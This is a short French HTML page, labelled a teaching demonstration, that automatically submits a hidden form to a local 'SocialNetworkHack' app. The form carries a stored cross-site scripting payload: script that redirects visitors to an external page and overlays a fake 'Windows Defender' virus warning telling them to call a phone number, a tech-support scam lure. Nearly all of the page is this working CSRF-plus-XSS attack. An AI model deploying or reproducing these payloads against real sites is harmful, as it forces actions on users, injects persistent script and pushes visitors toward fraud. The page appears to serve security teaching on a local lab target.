<h2>Page de démonstration pédagogique</h2>
<p>Cette page montre comment une page externe pourrait envoyer automatiquement un POST vers un autre site local.</p>

<!-- Formulaire envoyé automatiquement -->
<form id="autoPost" action="http://localhost/SocialNetworkHack/index.php" method="POST">
    <input type="hidden" name="content" value="&lt;script> window.location.replace(&quot;https://johnmclf.github.io/CsrfAttack_exemple/index.html&quot;);&lt;/script>&lt;script>document.body.innerHTML = ` &lt;div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%; background:red;color:white;font-size:40px;display:flex;justify-content:center;align-items:center;z-index:99999;&quot;>Windows Defender : « Un virus a été détecté, veuillez contacter le numéro suivant : 01 23 56 99 12 &lt;/div>`;&lt;/script>">
</form>

<script>
    // Envoi automatique du POST pour démonstration
    document.getElementById("autoPost").submit();
</script>

</body>
